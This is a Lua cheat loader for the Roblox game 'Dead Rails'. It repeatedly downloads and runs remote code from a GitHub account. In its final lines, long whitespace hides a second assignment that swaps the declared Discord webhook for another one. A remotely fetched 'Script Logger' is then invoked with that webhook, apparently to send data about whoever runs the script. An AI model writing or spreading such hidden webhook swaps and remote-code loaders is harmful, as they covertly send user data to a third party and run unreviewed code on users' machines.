local Script = {}
Script.Cache = {}
Script.File = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/File%20System.lua"))()
Script.Cache.Config = {
    AutoFarming = false
}
Script.File.Save("FriedPotato/DeadRails/config.json", Script.Cache.Config)
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Deadrails/Main.lua"))()
local UIS = game:GetService("UserInputService")
if not (UIS.TouchEnabled and not UIS.KeyboardEnabled) then return end
local ToggleButton = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Toggler.lua"))()
local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
local toggle = ToggleButton.MakeToggle("Friedpotato", function()
	local gui = PlayerGui:FindFirstChild("PremiumUI")
	if not gui then return end
	local frame = gui:FindFirstChild("MainFrame")
	if not frame then return end
	frame.Visible = not frame.Visible
end)

local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
local ScriptName = "Deadrails";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dFYW8OHpzEs2kIZumPyidNpISe_o0-";
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)

